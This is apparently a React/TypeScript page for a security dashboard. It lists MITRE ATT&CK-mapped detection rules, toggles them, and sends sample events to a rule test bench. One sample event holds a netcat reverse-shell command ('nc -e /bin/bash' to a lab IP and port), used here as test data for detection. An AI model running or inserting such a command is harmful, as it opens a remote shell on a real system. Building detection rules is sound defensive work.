import React, { useState, useEffect } from 'react';
import {
  Cpu,
  Search,
  CheckCircle2,
  AlertTriangle,
  Play,
  Sliders,
  Shield,
  Clock,
  Terminal,
  ExternalLink,
} from 'lucide-react';
import api from '../services/api';
import { DetectionRule } from '../types';
import { GlassCard } from '../components/common/GlassCard';
import { Badge } from '../components/common/Badge';
import { SlideOverDrawer } from '../components/common/SlideOverDrawer';

export const DetectionRulesPage: React.FC = () => {
  const [rules, setRules] = useState<DetectionRule[]>([]);
  const [selectedRule, setSelectedRule] = useState<DetectionRule | null>(null);
  const [testResult, setTestResult] = useState<any>(null);
  const [isTesting, setIsTesting] = useState(false);

  const fetchRules = async () => {
    try {
      const res = await api.get('/detection-rules');
      setRules(res.data);
    } catch (err) {
      console.error('Error fetching detection rules:', err);
    }
  };

  useEffect(() => {
    fetchRules();
  }, []);

  const handleToggle = async (ruleId: string, currentStatus: boolean) => {
    try {
      const res = await api.patch(`/detection-rules/${ruleId}`, {
        is_enabled: !currentStatus,
      });
      setRules((prev) => prev.map((r) => (r.rule_id === ruleId ? res.data : r)));
      if (selectedRule && selectedRule.rule_id === ruleId) {
        setSelectedRule(res.data);
      }
    } catch (err) {
      console.error('Toggle rule failed:', err);
    }
  };

  const handleRunTest = async (ruleId: string) => {
    setIsTesting(true);
    setTestResult(null);
    try {
      const samplePayload = {
        sample_event: {
          hostname: 'ubuntu-lab-01',
          source_ip: '192.168.56.99',
          event_type: selectedRule?.rule_id === 'DET-005' ? 'suspicious_process' : 'failed_login',
          message: 'Automated test bench sample evaluation payload',
          command_line: selectedRule?.rule_id === 'DET-005' ? 'nc -e /bin/bash 192.168.56.10 4444' : undefined,
          severity: 'high',
        },
      };
      const res = await api.post(`/detection-rules/${ruleId}/test`, samplePayload);
      setTestResult(res.data);
    } catch (err: any) {
      setTestResult({ error: err.response?.data?.detail || 'Test evaluation failed' });
    } finally {
      setIsTesting(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-xl font-bold text-white flex items-center gap-2">
            <Cpu className="w-5 h-5 text-cyan-400" />
            <span>Threat Detection Rules Engine</span>
          </h1>
          <p className="text-xs text-slate-400 mt-0.5">
            Rule-based correlation algorithms aligned with the MITRE ATT&CK Enterprise Framework
          </p>
        </div>
      </div>

      {/* Rules Table */}
      <GlassCard className="p-5">
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead>
              <tr className="text-slate-400 border-b border-white/10 font-mono text-[11px]">
                <th className="pb-3">Rule ID</th>
                <th className="pb-3">Name & MITRE Mapping</th>
                <th className="pb-3">Category</th>
                <th className="pb-3">Severity</th>
                <th className="pb-3">Threshold / Window</th>
                <th className="pb-3">Triggers</th>
                <th className="pb-3">Status</th>
                <th className="pb-3 text-right">Configure</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5 font-sans">
              {rules.map((rule) => (
                <tr
                  key={rule.rule_id}
                  onClick={() => { setSelectedRule(rule); setTestResult(null); }}
                  className="hover:bg-white/[0.03] transition-colors cursor-pointer group"
                >
                  <td className="py-3 font-mono font-bold text-cyan-400">{rule.rule_id}</td>
                  <td className="py-3 max-w-sm">
                    <div className="font-semibold text-slate-100">{rule.name}</div>
                    <div className="flex items-center gap-2 text-[10px] text-slate-400 font-mono mt-0.5">
                      <span className="text-cyan-400">{rule.mitre_technique}</span>
                      <span>•</span>
                      <span>{rule.mitre_tactic}</span>
                    </div>
                  </td>
                  <td className="py-3 capitalize text-slate-300">{rule.category}</td>
                  <td className="py-3">
                    <Badge size="sm" variant={rule.severity as any}>
                      {rule.severity}
                    </Badge>
                  </td>
                  <td className="py-3 font-mono text-slate-300">
                    {rule.threshold} events / {rule.time_window_seconds}s
                  </td>
                  <td className="py-3 font-mono font-bold text-white">
                    {rule.trigger_count}
                  </td>
                  <td className="py-3" onClick={(e) => e.stopPropagation()}>
                    <button
                      onClick={() => handleToggle(rule.rule_id, rule.is_enabled)}
                      className={`relative inline-flex h-5 w-9 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out ${
                        rule.is_enabled ? 'bg-cyan-500 shadow-neon-cyan' : 'bg-slate-700'
                      }`}
                    >
                      <span
                        className={`inline-block h-4 w-4 transform rounded-full bg-white shadow transition duration-200 ease-in-out ${
                          rule.is_enabled ? 'translate-x-4' : 'translate-x-0'
                        }`}
                      />
                    </button>
                  </td>
                  <td className="py-3 text-right">
                    <button
                      onClick={() => { setSelectedRule(rule); setTestResult(null); }}
                      className="px-2 py-1 rounded-lg bg-white/5 hover:bg-white/10 text-slate-300 border border-white/10 font-mono text-[11px]"
                    >
                      Test Bench
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </GlassCard>

      {/* SlideOver Drawer for Rule Config & Test Bench */}
      <SlideOverDrawer
        isOpen={!!selectedRule}
        onClose={() => setSelectedRule(null)}
        title={`Detection Rule: ${selectedRule?.rule_id}`}
        subtitle={selectedRule?.name}
        width="max-w-xl"
      >
        {selectedRule && (
          <div className="space-y-6 text-xs">
            {/* Rule Info */}
            <div className="p-4 rounded-xl bg-white/[0.03] border border-white/5 space-y-3">
              <div className="flex items-center justify-between">
                <Badge variant={selectedRule.severity as any} size="md">
                  {selectedRule.severity.toUpperCase()}
                </Badge>
                <div className="flex items-center gap-2">
                  <span className="text-slate-400 font-mono">STATUS:</span>
                  <span className={`font-mono font-bold ${selectedRule.is_enabled ? 'text-cyan-400' : 'text-slate-500'}`}>
                    {selectedRule.is_enabled ? 'ACTIVE & EVALUATING' : 'DISABLED'}
                  </span>
                </div>
              </div>
              <p className="text-slate-200 text-sm leading-relaxed">{selectedRule.description}</p>
            </div>

            {/* MITRE Mapping */}
            <div className="grid grid-cols-2 gap-3 font-mono">
              <div className="p-3 rounded-xl bg-white/[0.02] border border-white/5">
                <span className="text-slate-500 block mb-1">MITRE Technique</span>
                <span className="text-cyan-300 font-bold">{selectedRule.mitre_technique}</span>
              </div>
              <div className="p-3 rounded-xl bg-white/[0.02] border border-white/5">
                <span className="text-slate-500 block mb-1">MITRE Tactic</span>
                <span className="text-slate-200 font-bold">{selectedRule.mitre_tactic}</span>
              </div>
              <div className="p-3 rounded-xl bg-white/[0.02] border border-white/5">
                <span className="text-slate-500 block mb-1">Threshold Condition</span>
                <span className="text-white font-bold">{selectedRule.threshold} occurrences</span>
              </div>
              <div className="p-3 rounded-xl bg-white/[0.02] border border-white/5">
                <span className="text-slate-500 block mb-1">Time Window</span>
                <span className="text-white font-bold">{selectedRule.time_window_seconds} seconds</span>
              </div>
            </div>

            {/* Recommended Automated Action */}
            <div className="p-4 rounded-xl bg-cyan-500/10 border border-cyan-500/20 space-y-1">
              <span className="text-cyan-400 font-semibold uppercase block">Automated Response Recommendation</span>
              <p className="text-slate-200 text-sm">{selectedRule.recommended_action}</p>
            </div>

            {/* Interactive Rule Test Bench */}
            <div className="p-4 rounded-xl bg-black/40 border border-white/10 space-y-3">
              <div className="flex items-center justify-between">
                <span className="font-mono text-cyan-400 font-bold flex items-center gap-1.5">
                  <Play className="w-3.5 h-3.5" />
                  <span>Rule Test Bench</span>
                </span>
                <button
                  disabled={isTesting}
                  onClick={() => handleRunTest(selectedRule.rule_id)}
                  className="px-3 py-1.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold font-mono transition-all disabled:opacity-50"
                >
                  {isTesting ? 'Evaluating...' : 'Execute Test Run'}
                </button>
              </div>

              <p className="text-slate-400">
                Dispatches an authentic test security payload through the ingestion engine to evaluate if detection criteria are satisfied.
              </p>

              {testResult && (
                <div
                  className={`p-3 rounded-lg border font-mono text-xs ${
                    testResult.triggered
                      ? 'bg-emerald-500/15 border-emerald-500/30 text-emerald-300'
                      : 'bg-amber-500/15 border-amber-500/30 text-amber-300'
                  }`}
                >
                  <p className="font-bold">{testResult.details}</p>
                  <p className="text-[11px] text-slate-400 mt-1">
                    Alerts Produced: {testResult.alerts_generated} • Test Event ID: #{testResult.test_event_id}
                  </p>
                </div>
              )}
            </div>
          </div>
        )}
      </SlideOverDrawer>
    </div>
  );
};
